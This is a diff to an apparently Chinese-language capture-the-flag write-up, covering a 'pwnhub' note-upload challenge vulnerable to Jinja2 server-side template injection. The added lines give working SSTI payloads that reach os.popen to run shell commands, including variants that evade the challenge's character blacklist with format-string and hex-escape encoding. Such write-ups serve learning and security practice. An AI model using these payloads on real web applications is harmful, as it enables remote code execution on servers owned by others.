@@ -124,7 +124,7 @@ sh不支持多级目录通配符...
 `bctf{Lucky_you_I_did_not_code_this_stuff_in_Ruby_lasudkjklhdsfkhjkae}`
 
 ### pwnhub
-
+#ssti
 可以上传笔记内容,存在ssti
 ```python
 @app.get('/view/<id>')
@@ -166,9 +166,18 @@ users = {
 不需要绕,是先append然后根据len来显示错误消息,可以自己计算post_id
 黑名单`INVALID = ["{{", "}}", ".", "_", "[", "]","\\", "x"]`
 
-`{{config.__class__.__init__.__globals__['os'].popen('ls').read()}}`
+
+`{% print(lipsum.__globals__.__builtins__['__import__']('os').popen('ls').read()) %}`
 
 
+
+```bash
+{%print(lipsum|attr('%c%c%c%c%c%c%c%c%c%c%c'|format(95,95,103,108,111,98,97,108,115,95,95,))|attr('%c%c%c%c%c%c%c%c%c%c%c%c'|format(95,95,98,117,105,108,116,105,110,115,95,95,))|attr('%c%c%c%c%c%c%c%c%c%c'|format(95,95,105,109,112,111,114,116,95,95,))('os')|attr('popen')('ls')|attr('read')())%}
+```
+
+```bash
+{{request|attr('application')|attr('\x5f\x5fglobals\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fbuiltins\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fimport\x5f\x5f')('os')|attr('popen')('id')|attr('read')()}}
+```
 # reverse
 
 # pwn
